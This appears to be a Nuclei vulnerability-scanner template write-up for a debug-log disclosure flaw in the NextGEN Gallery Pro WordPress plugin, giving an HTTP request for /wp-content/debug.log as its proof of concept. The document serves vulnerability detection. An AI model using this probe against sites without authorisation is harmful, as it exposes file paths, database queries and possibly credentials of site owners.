# Nuclei Template: WordPress NextGEN Gallery Pro - Error Log Disclosure
**Template ID:** nextgen-gallery-pro-error-log
**Vulnerability Class:** Insertion of Sensitive Information into Log File
**Severity:** Medium
**CWE:** CWE-532
**Source:** Nuclei Template (`nextgen-gallery-pro-error-log.yaml`)

## Vulnerability Information & PoC

## Description
The NextGEN Gallery Pro plugin for WordPress may expose debug/error log files that contain sensitive information including file paths, database queries, and potentially credentials. These log files are accessible without authentication.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}
GET {{BaseURL}}/wp-content/debug.log
```

## References
- https://wpscan.com/plugin/nextgen-gallery/
- https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-nextgen-gallery-wordpress-gallery-information-disclosure-1-9-11/
